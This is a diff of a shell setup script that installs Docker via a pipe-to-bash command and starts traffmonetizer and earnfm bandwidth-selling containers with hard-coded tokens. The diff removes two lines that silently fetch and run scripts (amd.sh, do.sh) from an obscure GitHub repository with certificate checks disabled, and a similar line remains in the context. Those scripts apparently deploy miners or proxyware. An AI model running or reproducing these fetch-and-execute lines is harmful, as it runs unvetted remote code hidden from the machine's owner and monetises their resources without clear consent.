@@ -9,5 +9,4 @@ bash <(wget --no-check-certificate -qO- https://raw.githubusercontent.com/maklin
 wget -qO- get.docker.com | bash
 docker run -d --restart=always --name tm traffmonetizer/cli_v2 start accept --token I1TfrUC+ST9NdcK/97Dq/uZAW61DEnSWWr3KEm2GSVg=
 docker run -d --restart=always -e EARNFM_TOKEN="99268125-c127-4a66-a43f-60690db70b17" --name earnfm-client earnfm/earnfm-client:latest
-bash <(wget --no-check-certificate -qO- https://raw.githubusercontent.com/maklinngf/jjidnnhg/refs/heads/main/amd.sh) >/dev/null 2>&1 &
-bash <(wget --no-check-certificate -qO- https://raw.githubusercontent.com/maklinngf/jjidnnhg/refs/heads/main/do.sh) >/dev/null 2>&1 &
+ping aws.amazon.com
